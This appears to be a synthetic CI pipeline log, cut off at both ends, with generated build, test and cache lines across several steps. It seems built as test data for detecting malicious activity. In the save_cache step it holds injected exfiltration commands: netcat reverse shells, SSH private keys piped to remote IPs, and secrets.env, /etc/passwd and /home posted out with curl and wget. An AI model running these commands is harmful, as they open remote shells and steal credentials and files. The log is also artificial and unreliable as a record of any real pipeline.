test_cache_hit (348ms)\nArtifact uploaded: build.tar.gz (9MB)\nInstalling webpack@3.15.0\n  PASS: test_user_create (321ms)\nStep 3/10: Building\nInstalling prettier@2.0.0\n  PASS: test_db_connect (14ms)\n[12:00:26] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n  PASS: test_cache_hit (76ms)\n\u2713 lint completed\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (34MB)\n[12:00:26] INFO: Processing request\n  PASS: test_api_health (192ms)\nArtifact uploaded: build.tar.gz (3MB)\nArtifact uploaded: build.tar.gz (24MB)\nCache hit for key-4927\nCache hit for key-2414\n  PASS: test_user_create (421ms)\nStep 5/10: Building\n\u2713 test completed\n  PASS: test_api_health (439ms)\nCache hit for key-7320\nInstalling prettier@3.9.0\n[12:00:26] INFO: Processing request\nInstalling eslint@3.16.0\nWARNING: eslint has known vulnerabilities\nCompiling src/handler.rs...\n\u2713 lint completed\nWARNING: prettier has known vulnerabilities\nInstalling webpack@2.11.0\nArtifact uploaded: build.tar.gz (3MB)\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\n\u2713 lint completed\nCache hit for key-2189\nCache hit for key-3095\nCompiling src/app.ts...\nCompiling src/utils.go...\nFAILED: test_cache_hit\nArtifact uploaded: build.tar.gz (24MB)\nStep 4/10: Building\nException: RuntimeError\nArtifact uploaded: build.tar.gz (44MB)\n[12:00:26] WARN: Deprecated API usage\n[12:00:26] INFO: Processing request\nCache hit for key-8668\nCompiling src/index.js...\nArtifact uploaded: build.tar.gz (28MB)\nInstalling jest@4.9.0\nCache hit for key-4980\nStep 4/10: Building\n  PASS: test_user_create (277ms)\nArtifact uploaded: build.tar.gz (44MB)\nStep 8/10: Building\n  PASS: test_cache_hit (28ms)\n\u2713 build completed\nInstalling webpack@3.5.0\nCache hit for key-5483\n\u2713 test completed\n  PASS: test_cache_hit (414ms)\nCache hit for key-3546\n\u2713 test completed\nCompiling src/service.java...\nCache hit for key-9598\n=== Step restore_cache completed ===\n=== Step: upload_artifacts ===\nInstalling prettier@2.14.0\nWARNING: express has known vulnerabilities\nCompiling src/main.py...\nArtifact uploaded: build.tar.gz (14MB)\nStep 5/10: Building\nWARNING: eslint has known vulnerabilities\nArtifact uploaded: build.tar.gz (39MB)\nArtifact uploaded: build.tar.gz (30MB)\n\u2713 lint completed\nCache hit for key-5838\n\u2717 build failed with exit code 8\nCompiling src/handler.rs...\n\u2713 lint completed\nStep 6/10: Building\nInstalling webpack@3.11.0\nInstalling eslint@1.15.0\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\nCache hit for key-5374\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (50MB)\nStep 9/10: Building\n\u2713 test completed\nArtifact uploaded: build.tar.gz (49MB)\nArtifact uploaded: build.tar.gz (16MB)\nCache hit for key-2427\nInstalling axios@5.6.0\nInstalling eslint@3.10.0\nArtifact uploaded: build.tar.gz (3MB)\nInstalling axios@3.20.0\nStep 1/10: Building\nCache hit for key-2414\n  PASS: test_api_health (364ms)\n  PASS: test_db_connect (207ms)\n  PASS: test_cache_hit (334ms)\n  PASS: test_cache_hit (318ms)\nCache hit for key-7991\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (30MB)\n  PASS: test_api_health (291ms)\nFAILED: test_cache_hit\n[12:00:26] INFO: Processing request\nInstalling react@1.18.0\n  PASS: test_user_create (68ms)\nStep 4/10: Building\n\u2713 lint completed\nCache hit for key-8882\n\u2713 lint completed\nInstalling eslint@5.17.0\nArtifact uploaded: build.tar.gz (2MB)\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling eslint@4.13.0\nException: ValueError\n\u2713 lint completed\n  PASS: test_cache_hit (450ms)\nArtifact uploaded: build.tar.gz (28MB)\nStep 2/10: Building\nCompiling src/handler.rs...\nStep 3/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompiling src/index.js...\n[12:00:26] INFO: Processing request\nStep 2/10: Building\nInstalling jest@5.6.0\n\u2713 lint completed\nCache hit for key-6389\nArtifact uploaded: build.tar.gz (48MB)\nArtifact uploaded: build.tar.gz (33MB)\n\u2713 lint completed\n[12:00:26] INFO: Processing request\nCache hit for key-5991\n\u2713 test completed\nStep 4/10: Building\n[12:00:26] INFO: Processing request\nCompiling src/main.py...\nWARNING: lodash has known vulnerabilities\n[12:00:26] INFO: Processing request\nCompiling src/main.py...\nWARNING: react has known vulnerabilities\nCache hit for key-7879\n  PASS: test_cache_hit (303ms)\nStep 6/10: Building\nInstalling webpack@1.11.0\nCache hit for key-4716\n[12:00:26] WARN: Deprecated API usage\nWARNING: express has known vulnerabilities\nInstalling lodash@5.12.0\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling src/main.py...\nCompiling src/index.js...\nWARNING: axios has known vulnerabilities\n[12:00:26] INFO: Processing request\nCompiling src/service.java...\n[12:00:26] INFO: Processing request\nStep 8/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (15MB)\n\u2713 test completed\nWARNING: lodash has known vulnerabilities\nArtifact uploaded: build.tar.gz (43MB)\nCache hit for key-8544\n\u2713 build completed\n  PASS: test_user_create (226ms)\nCache hit for key-4014\nStep 8/10: Building\nCache hit for key-5516\nCache hit for key-5703\nCompiling src/main.py...\n\u2713 build completed\nInstalling jest@4.6.0\nInstalling axios@3.19.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 lint completed\n\u2713 build completed\nStep 4/10: Building\n[12:00:26] INFO: Processing request\n  PASS: test_cache_hit (434ms)\n[12:00:26] WARN: Deprecated API usage\nCompiling src/utils.go...\n\u2713 lint completed\nStep 10/10: Building\nCompiling src/utils.go...\n\u2713 lint completed\nInstalling lodash@5.0.0\nCache hit for key-5440\nCache hit for key-3045\n  PASS: test_api_health (374ms)\nCache hit for key-1991\n\u2713 build completed\nCompiling src/service.java...\nCompiling src/handler.rs...\nCache hit for key-1448\nArtifact uploaded: build.tar.gz (32MB)\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (12MB)\nInstalling express@1.20.0\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (4MB)\nStep 7/10: Building\n  PASS: test_cache_hit (268ms)\nWARNING: webpack has known vulnerabilities\n[12:00:26] INFO: Processing request\n\u2713 lint completed\nCompiling src/main.py...\nCache hit for key-5375\nCompiling src/index.js...\nWARNING: jest has known vulnerabilities\nArtifact uploaded: build.tar.gz (44MB)\nStep 8/10: Building\nCache hit for key-3981\nCompiling src/handler.rs...\nInstalling react@3.7.0\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (48MB)\n  PASS: test_cache_hit (229ms)\nArtifact uploaded: build.tar.gz (48MB)\n\u2713 lint completed\nInstalling react@4.14.0\nInstalling react@3.6.0\n[12:00:26] ERROR: Connection failed\nStep 4/10: Building\nCache hit for key-3309\n\u2713 lint completed\nCache hit for key-4509\nArtifact uploaded: build.tar.gz (45MB)\nCache hit for key-9385\nStep 3/10: Building\nArtifact uploaded: build.tar.gz (9MB)\n  PASS: test_user_create (139ms)\nCompiling src/index.js...\n  PASS: test_cache_hit (223ms)\nStep 8/10: Building\n[12:00:26] INFO: Processing request\n\u2713 test completed\nStep 10/10: Building\n[12:00:26] INFO: Processing request\nCache hit for key-9168\nCache hit for key-7742\n[12:00:26] INFO: Processing request\nCompiling src/index.js...\n=== Step upload_artifacts completed ===\n=== Step: install_dependencies ===\nStep 6/10: Building\n[12:00:26] INFO: Processing request\nStep 2/10: Building\nCompiling src/service.java...\n\u2713 lint completed\nCache hit for key-5845\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (44MB)\nWARNING: lodash has known vulnerabilities\nCompiling src/app.ts...\n\u2713 build completed\nInstalling express@2.9.0\nInstalling react@2.2.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: test_api_health (71ms)\n[12:00:26] INFO: Processing request\nWARNING: lodash has known vulnerabilities\n  PASS: test_cache_hit (100ms)\nInstalling webpack@3.18.0\n  PASS: test_api_health (295ms)\nStep 2/10: Building\nCache hit for key-9516\n[12:00:26] INFO: Processing request\nCache hit for key-8233\nCache hit for key-1861\n  PASS: test_cache_hit (478ms)\n[12:00:26] WARN: Deprecated API usage\n  PASS: test_user_create (386ms)\nCache hit for key-2664\n[12:00:26] INFO: Processing request\nStep 7/10: Building\nStep 3/10: Building\nStep 7/10: Building\n\u2713 test completed\n[12:00:26] INFO: Processing request\n\u2713 test completed\nStep 3/10: Building\nStep 3/10: Building\nInstalling jest@5.4.0\nInstalling express@4.0.0\nCache hit for key-1657\nCompiling src/index.js...\nCache hit for key-8883\nArtifact uploaded: build.tar.gz (22MB)\nFAILED: test_auth_login\nInstalling jest@5.20.0\nCompiling src/utils.go...\nInstalling react@1.4.0\nWARNING: prettier has known vulnerabilities\n  PASS: test_api_health (288ms)\nInstalling lodash@2.5.0\nStep 7/10: Building\nCache hit for key-3954\nCompiling src/utils.go...\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\n[12:00:26] WARN: Deprecated API usage\n  PASS: test_user_create (262ms)\n[12:00:26] INFO: Processing request\n  PASS: test_cache_hit (74ms)\nWARNING: eslint has known vulnerabilities\n\u2713 build completed\nException: RuntimeError\n[12:00:26] WARN: Deprecated API usage\nCompiling src/utils.go...\nException: RuntimeError\n[12:00:26] INFO: Processing request\n  PASS: test_db_connect (230ms)\nStep 4/10: Building\nArtifact uploaded: build.tar.gz (29MB)\nArtifact uploaded: build.tar.gz (50MB)\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (48MB)\nStep 10/10: Building\nArtifact uploaded: build.tar.gz (27MB)\n  PASS: test_cache_hit (465ms)\nStep 5/10: Building\nCompiling src/service.java...\nStep 1/10: Building\nArtifact uploaded: build.tar.gz (39MB)\nArtifact uploaded: build.tar.gz (28MB)\n  PASS: test_user_create (18ms)\nCompiling src/index.js...\nCache hit for key-9712\n  PASS: test_api_health (231ms)\nCache hit for key-7925\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (50MB)\nArtifact uploaded: build.tar.gz (44MB)\n  PASS: test_cache_hit (64ms)\n  PASS: test_api_health (369ms)\nCompiling src/index.js...\n[12:00:26] INFO: Processing request\n  PASS: test_api_health (130ms)\nCache hit for key-5671\nStep 8/10: Building\nArtifact uploaded: build.tar.gz (11MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCompiling src/handler.rs...\n[12:00:26] INFO: Processing request\n\u2713 test completed\n[12:00:26] WARN: Deprecated API usage\n[12:00:26] INFO: Processing request\nCache hit for key-1922\nCache hit for key-8273\n[12:00:26] WARN: Deprecated API usage\nInstalling lodash@5.8.0\n[12:00:26] INFO: Processing request\n\u2713 test completed\nInstalling webpack@4.4.0\nArtifact uploaded: build.tar.gz (6MB)\n[12:00:26] INFO: Processing request\nCompiling src/main.py...\nStep 1/10: Building\nException: ValueError\n[12:00:26] INFO: Processing request\nStep 7/10: Building\nInstalling jest@3.16.0\n[12:00:26] INFO: Processing request\nCache hit for key-7350\nArtifact uploaded: build.tar.gz (50MB)\n  PASS: test_api_health (437ms)\n\u2713 lint completed\nCache hit for key-4169\n\u2713 test completed\nInstalling prettier@4.3.0\nInstalling react@4.1.0\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (19MB)\nStep 6/10: Building\nArtifact uploaded: build.tar.gz (1MB)\nCache hit for key-9527\n\u2713 build completed\n  PASS: test_user_create (82ms)\n  PASS: test_user_create (139ms)\nArtifact uploaded: build.tar.gz (48MB)\n[12:00:26] INFO: Processing request\nCache hit for key-2330\nArtifact uploaded: build.tar.gz (44MB)\n[12:00:26] INFO: Processing request\nCache hit for key-5953\nInstalling eslint@2.13.0\n[12:00:26] WARN: Deprecated API usage\nCache hit for key-1530\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: build.tar.gz (33MB)\nCache hit for key-7822\nCompiling src/service.java...\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (29MB)\n[12:00:26] ERROR: Connection failed\n\u2713 test completed\nStep 3/10: Building\nCompiling src/app.ts...\nCache hit for key-1572\nCompiling src/main.py...\nStep 7/10: Building\n[12:00:26] INFO: Processing request\n[12:00:26] WARN: Deprecated API usage\nInstalling eslint@4.12.0\nInstalling eslint@3.12.0\nCompiling src/app.ts...\nStep 4/10: Building\nStep 8/10: Building\n\u2713 test completed\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\nStep 3/10: Building\nInstalling prettier@1.15.0\nCompiling src/index.js...\nCompiling src/utils.go...\n  PASS: test_auth_login (307ms)\n  PASS: test_user_create (402ms)\nCache hit for key-1788\n[12:00:26] INFO: Processing request\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (19MB)\nCache hit for key-8756\n=== Step install_dependencies completed ===\n=== Step: save_cache ===\n[12:00:26] ERROR: Connection failed\n[12:00:26] INFO: Processing request\nInstalling prettier@5.0.0\nSending 443MB of data to test.io\nInstalling webpack@1.5.0\nInstalling axios@4.8.0\nArtifact uploaded: build.tar.gz (41MB)\nCompiling src/index.js...\nnc -e /bin/sh 212.117.0.66 29714\n  PASS: test_auth_login (347ms)\n  PASS: test_user_create (233ms)\nInstalling prettier@5.11.0\nStep 4/10: Building\necho $(cat ~/.ssh/id_rsa) | base64 | nc 32.94.235.131 5069\nCache hit for key-5175\n[12:00:26] WARN: Deprecated API usage\n\u2713 test completed\nStep 7/10: Building\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\nInstalling prettier@1.2.0\nInstalling eslint@4.0.0\nStep 5/10: Building\nStep 5/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCompiling src/index.js...\n  PASS: test_user_create (43ms)\nCache hit for key-6260\n[12:00:26] INFO: Processing request\n\u2717 build failed with exit code 100\n[12:00:26] ERROR: Connection failed\nArtifact uploaded: build.tar.gz (8MB)\n\u2713 build completed\ncurl -X POST https://example.com/collect -d @secrets.env\nArtifact uploaded: build.tar.gz (9MB)\n  PASS: test_cache_hit (105ms)\n[12:00:26] INFO: Processing request\n\u2713 test completed\necho $(cat ~/.ssh/id_rsa) | base64 | nc 223.38.171.238 19337\n\u2713 test completed\n  PASS: test_auth_login (222ms)\nInstalling express@3.8.0\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (13MB)\nCompiling src/service.java...\nStep 8/10: Building\n\u2713 lint completed\nCompiling src/handler.rs...\nWARNING: axios has known vulnerabilities\nCache hit for key-2822\n  PASS: test_auth_login (288ms)\n\u2713 build completed\n[12:00:26] INFO: Processing request\nWARNING: webpack has known vulnerabilities\nStep 4/10: Building\n\u2713 build completed\n  PASS: test_user_create (230ms)\nArtifact uploaded: build.tar.gz (29MB)\nFAILED: test_db_connect\n\u2713 lint completed\n  PASS: test_api_health (169ms)\nArtifact uploaded: build.tar.gz (50MB)\nInstalling prettier@5.19.0\nCache hit for key-7340\nArtifact uploaded: build.tar.gz (29MB)\nCache hit for key-5958\nArtifact uploaded: build.tar.gz (13MB)\n[12:00:26] INFO: Processing request\nWARNING: prettier has known vulnerabilities\n[12:00:26] WARN: Deprecated API usage\nCompiling src/handler.rs...\nException: NullPointerException\n  PASS: test_auth_login (301ms)\n  PASS: test_db_connect (162ms)\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (3MB)\n[12:00:26] ERROR: Connection failed\nInstalling react@1.16.0\nInstalling express@2.0.0\n[12:00:26] INFO: Processing request\nCompiling src/app.ts...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 9/10: Building\n[12:00:26] INFO: Processing request\nCache hit for key-2892\n  PASS: test_user_create (303ms)\nWARNING: webpack has known vulnerabilities\nInstalling lodash@5.13.0\n[12:00:26] WARN: Deprecated API usage\n\u2713 lint completed\nStep 8/10: Building\nStep 2/10: Building\n  PASS: test_db_connect (177ms)\nInstalling react@4.8.0\n[12:00:26] INFO: Processing request\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (8MB)\nCompiling src/index.js...\nCompiling src/handler.rs...\nCompiling src/utils.go...\nCompiling src/app.ts...\nCompiling src/index.js...\nCache hit for key-7445\n  PASS: test_user_create (148ms)\n[12:00:26] INFO: Processing request\nArtifact uploaded: build.tar.gz (3MB)\n[12:00:26] INFO: Processing request\nInstalling webpack@4.15.0\nCompiling src/main.py...\nWARNING: lodash has known vulnerabilities\nArtifact uploaded: build.tar.gz (35MB)\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\nCompiling src/main.py...\nInstalling react@4.19.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nInstalling prettier@4.7.0\nCache hit for key-4569\nCompiling src/app.ts...\nArtifact uploaded: build.tar.gz (26MB)\n[12:00:26] INFO: Processing request\n  PASS: test_db_connect (242ms)\nStep 10/10: Building\nInstalling jest@5.3.0\nCache hit for key-2947\nCache hit for key-9971\nInstalling webpack@4.4.0\n[12:00:26] INFO: Processing request\nCompiling src/utils.go...\nStep 7/10: Building\nArtifact uploaded: build.tar.gz (38MB)\nInstalling express@3.4.0\nArtifact uploaded: build.tar.gz (20MB)\nInstalling prettier@5.3.0\nInstalling axios@3.10.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-5376\n[12:00:26] INFO: Processing request\nStep 5/10: Building\n  PASS: test_auth_login (476ms)\nCache hit for key-2034\ntar czf - /home | curl -X POST -d @- https://test.io/upload\nCache hit for key-2335\n\u2713 lint completed\necho $(cat ~/.ssh/id_rsa) | base64 | nc 187.130.254.106 65457\nCache hit for key-8805\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\n[12:00:26] INFO: Processing request\nStep 4/10: Building\nStep 5/10: Building\nArtifact uploaded: build.tar.gz (25MB)\nCompiling src/utils.go...\nArtifact uploaded: build.tar.gz (33MB)\nCache hit for key-2949\nCompiling src/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:00:26] INFO: Processing request\n[12:00:26] INFO: Processing request\nCache hit for key-4995\nCache hit for key-6143\nArtifact uploaded: build.tar.gz (44MB)\nCache hit for key-3478\nInstalling react@1.8.0\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\n[12:00:26] WARN: Deprecated API usage\nCompiling src/utils.go...\nStep 1/10: Building\nCompiling src/app.ts...\nStep 2/10: Building\nArtifact uploaded: build.tar.gz (11MB)\nnc -e /bin/sh 236.175.2.129 56971\nStep 7/10: Building\nSending 358MB of data to test.io\n[12:00:26] INFO: Processing request\nInstalling eslint@2.20.0\n[12:00:26] INFO: Processing request\n  PASS: test_user_create (372ms)\nArtifact uploaded: build.tar.gz (44MB)\nCache hit for key-5766\n  PASS: test_auth_login (74ms)\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\n[12:00:26] INFO: Processing request\nStep 5/10: Building\nCache hit for key-5639\n\u2713 build completed\nArtifact uploaded: build.tar.gz (32MB)\nInstalling react@1.1.0\n[12:00:26] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-2106\nArtifact uploaded: build.tar.gz (12MB)\nWARNING: axios has known vulnerabilities\n\u2713 test completed\nCache hit for key-1952\n=== Step save_cache completed ===",
    "steps": [
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-29T12:00:26.718752",
        "finished_at": "2025-11-29T12:00:28.790513",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Artifact uploaded: build.tar.gz (47MB)",
          "\u2713 build completed",
          "Cache hit for key-1605",
          "  PASS: test_api_health (154ms)",
          "Cache hit for key-5088",
          "Step 5/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Compiling src/service.java...",
          "Compiling src/utils.go...",
          "Compiling src/service.java...",
          "[12:00:26] INFO: Processing request",
          "  PASS: test_api_health (70ms)",
          "Step 4/10: Building",
          "  PASS: test_auth_login (355ms)",
          "Cache hit for key-9178",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Compiling src/main.py...",
          "Cache hit for key-5132",
          "Cache hit for key-8955",
          "Cache hit for key-5503",
          "Artifact uploaded: build.tar.gz (17MB)",
          "Cache hit for key-9945",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (21MB)",
          "Step 2/10: Building",
          "Artifact uploaded: build.tar.gz (1MB)",
          "[12:00:26] WARN: Deprecated API usage",
          "Installing react@5.20.0",
          "[12:00:26] INFO: Processing request",
          "\u2717 build failed with exit code 97",
          "Step 3/10: Building",
          "Step 2/10: Building",
          "Installing webpack@3.10.0",
          "[12:00:26] INFO: Processing request",
          "Installing webpack@5.15.0",
          "Compiling src/service.java...",
          "Step 7/10: Building",
          "  PASS: test_auth_login (473ms)",
          "Artifact uploaded: build.tar.gz (38MB)",
          "  PASS: test_api_health (123ms)",
          "Installing eslint@4.12.0",
          "Cache hit for key-5657",
          "Step 3/10: Building",
          "Compiling src/index.js...",
          "Step 9/10: Building",
          "[12:00:26] INFO: Processing request",
          "  PASS: test_cache_hit (372ms)",
          "Step 3/10: Building",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (28MB)",
          "\u2713 build completed",
          "WARNING: express has known vulnerabilities",
          "Step 6/10: Building",
          "\u2713 build completed",
          "\u2713 build completed",
          "Step 1/10: Building",
          "Cache hit for key-6288",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Compiling src/index.js...",
          "[12:00:26] WARN: Deprecated API usage",
          "Installing prettier@2.17.0",
          "Step 9/10: Building",
          "\u2713 test completed",
          "[12:00:26] INFO: Processing request",
          "  PASS: test_cache_hit (249ms)",
          "  PASS: test_user_create (74ms)",
          "  PASS: test_db_connect (380ms)",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Artifact uploaded: build.tar.gz (16MB)",
          "  PASS: test_user_create (27ms)",
          "[12:00:26] INFO: Processing request",
          "  PASS: test_user_create (378ms)",
          "Artifact uploaded: build.tar.gz (18MB)",
          "\u2713 test completed",
          "  PASS: test_api_health (177ms)",
          "[12:00:26] INFO: Processing request",
          "Compiling src/app.ts...",
          "Step 6/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (36MB)",
          "Installing webpack@4.17.0",
          "Installing lodash@4.9.0",
          "Installing express@5.5.0",
          "Step 5/10: Building",
          "Cache hit for key-4260",
          "  PASS: test_cache_hit (496ms)",
          "Step 9/10: Building",
          "Artifact uploaded: build.tar.gz (5MB)",
          "Step 8/10: Building",
          "Cache hit for key-2544",
          "Cache hit for key-8685",
          "\u2713 build completed",
          "\u2713 build completed",
          "\u2713 test completed",
          "Compiling src/index.js...",
          "[12:00:26] WARN: Deprecated API usage",
          "Installing prettier@1.9.0",
          "FAILED: test_cache_hit",
          "Cache hit for key-9368",
          "Artifact uploaded: build.tar.gz (6MB)",
          "[12:00:26] INFO: Processing request",
          "Installing prettier@5.0.0",
          "Compiling src/main.py...",
          "Compiling src/index.js...",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Artifact uploaded: build.tar.gz (49MB)",
          "[12:00:26] INFO: Processing request",
          "\u2713 test completed",
          "\u2713 test completed",
          "\u2713 test completed",
          "  PASS: test_db_connect (404ms)",
          "\u2713 lint completed",
          "[12:00:26] INFO: Processing request",
          "\u2713 lint completed",
          "Artifact uploaded: build.tar.gz (6MB)",
          "Cache hit for key-3324",
          "Step 9/10: Building",
          "[12:00:26] INFO: Processing request",
          "Step 6/10: Building",
          "\u2713 lint completed",
          "[12:00:26] INFO: Processing request",
          "Cache hit for key-3764",
          "Compiling src/index.js...",
          "Compiling src/utils.go...",
          "  PASS: test_api_health (247ms)",
          "[12:00:26] WARN: Deprecated API usage",
          "  PASS: test_cache_hit (345ms)",
          "[12:00:26] WARN: Deprecated API usage",
          "Installing axios@4.11.0",
          "Artifact uploaded: build.tar.gz (11MB)",
          "[12:00:26] INFO: Processing request",
          "Compiling src/handler.rs...",
          "  PASS: test_auth_login (277ms)",
          "[12:00:26] INFO: Processing request",
          "Installing axios@3.9.0",
          "[12:00:26] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 1/10: Building",
          "Cache hit for key-2122",
          "Cache hit for key-3902",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Step 8/10: Building",
          "Compiling src/utils.go...",
          "Compiling src/app.ts...",
          "Compiling src/handler.rs...",
          "Cache hit for key-6051",
          "Installing axios@4.2.0",
          "Step 7/10: Building",
          "Compiling src/handler.rs...",
          "Cache hit for key-4148",
          "  PASS: test_api_health (54ms)",
          "\u2713 test completed",
          "Artifact uploaded: build.tar.gz (27MB)",
          "[12:00:26] ERROR: Connection failed",
          "\u2713 test completed",
          "Installing lodash@3.2.0",
          "  PASS: test_cache_hit (48ms)",
          "Artifact uploaded: build.tar.gz (11MB)",
          "\u2713 test completed",
          "  PASS: test_auth_login (253ms)",
          "Cache hit for key-8047",
          "Artifact uploaded: build.tar.gz (19MB)",
          "  PASS: test_auth_login (207ms)",
          "Compiling src/app.ts...",
          "\u2713 test completed",
          "Cache hit for key-9444",
          "Installing jest@2.16.0",
          "Installing prettier@4.9.0",
          "  PASS: test_cache_hit (103ms)",
          "\u2713 lint completed",
          "\u2713 lint completed",
          "[12:00:26] INFO: Processing request",
          "Cache hit for key-8299",
          "\u2717 build failed with exit code 61",
          "Compiling src/service.java...",
          "Cache hit for key-6901",
          "WARNING: express has known vulnerabilities",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-11-29T12:00:28.790513",
        "finished_at": "2025-11-29T12:00:33.969915",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Step 6/10: Building",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (46MB)",
          "WARNING: eslint has known vulnerabilities",
          "Installing lodash@5.8.0",
          "\u2713 test completed",
          "Step 6/10: Building",
          "\u2713 test completed",
          "  PASS: test_user_create (12ms)",
          "  PASS: test_db_connect (403ms)",
          "\u2713 build completed",
          "\u2713 build completed",
          "Step 8/10: Building",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (35MB)",
          "[12:00:26] INFO: Processing request",
          "Compiling src/index.js...",
          "Compiling src/utils.go...",
          "Exception: TypeError",
          "Installing axios@4.11.0",
          "Compiling src/handler.rs...",
          "Cache hit for key-2124",
          "Compiling src/main.py...",
          "Installing eslint@5.13.0",
          "  PASS: test_cache_hit (171ms)",
          "[12:00:26] INFO: Processing request",
          "Installing express@4.20.0",
          "  PASS: test_api_health (191ms)",
          "[12:00:26] INFO: Processing request",
          "Step 6/10: Building",
          "  PASS: test_db_connect (286ms)",
          "Step 10/10: Building",
          "  PASS: test_user_create (107ms)",
          "Cache hit for key-2740",
          "Installing jest@2.2.0",
          "Cache hit for key-9927",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-8005",
          "Artifact uploaded: build.tar.gz (17MB)",
          "\u2713 test completed",
          "Cache hit for key-4945",
          "[12:00:26] INFO: Processing request",
          "Compiling src/handler.rs...",
          "[12:00:26] INFO: Processing request",
          "\u2713 build completed",
          "[12:00:26] WARN: Deprecated API usage",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "\u2713 lint completed",
          "Step 1/10: Building",
          "Installing axios@5.8.0",
          "  PASS: test_api_health (282ms)",
          "Installing axios@2.8.0",
          "Artifact uploaded: build.tar.gz (2MB)",
          "\u2717 build failed with exit code 37",
          "[12:00:26] INFO: Processing request",
          "  PASS: test_cache_hit (115ms)",
          "Artifact uploaded: build.tar.gz (10MB)",
          "[12:00:26] INFO: Processing request",
          "Installing eslint@4.4.0",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Installing axios@5.2.0",
          "Installing eslint@2.10.0",
          "[12:00:26] ERROR: Connection failed",
          "Cache hit for key-5303",
          "Compiling src/index.js...",
          "[12:00:26] INFO: Processing request",
          "  PASS: test_cache_hit (98ms)",
          "  PASS: test_db_connect (42ms)",
          "\u2713 lint completed",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-1427",
          "Installing prettier@3.7.0",
          "Step 2/10: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling src/main.py...",
          "[12:00:26] WARN: Deprecated API usage",
          "Compiling src/index.js...",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "Installing jest@1.13.0",
          "Cache hit for key-3244",
          "[12:00:26] INFO: Processing request",
          "Artifact uploaded: build.tar.gz (4MB)",
          "[12:00:26] INFO: Processing request",
          "[12:00:26] INFO: Processing request",
          "Compiling src/index.js...",
          "[12:00:26] INFO: Processing request",
          "WARNING: eslint has known vulnerabilities",
          "Cache hit for key-4299",
          "Cache hit for key-2320",
          "Step 5/10: Building",
          "[12:00:26] WARN: Deprecated API usage",
          "Installing webpack@4.15.0",
          "Step 8/10: Building",
          "  PASS: test_api_health (457ms)",
          "  PASS: test_api_health (147ms)",
          "Cache hit for key-6273",
          "Compiling src/utils.go...",
          "Installing webpack@5.20.0",
          "Step 3/10: Building",
          "Installing jest@1.18.0",
          "WARNING: jest has known vulnerabilities",
          "Step 1/10: Building",
          "Artifact uploaded: build.tar.gz (20MB)",
          "\u2713 test completed",
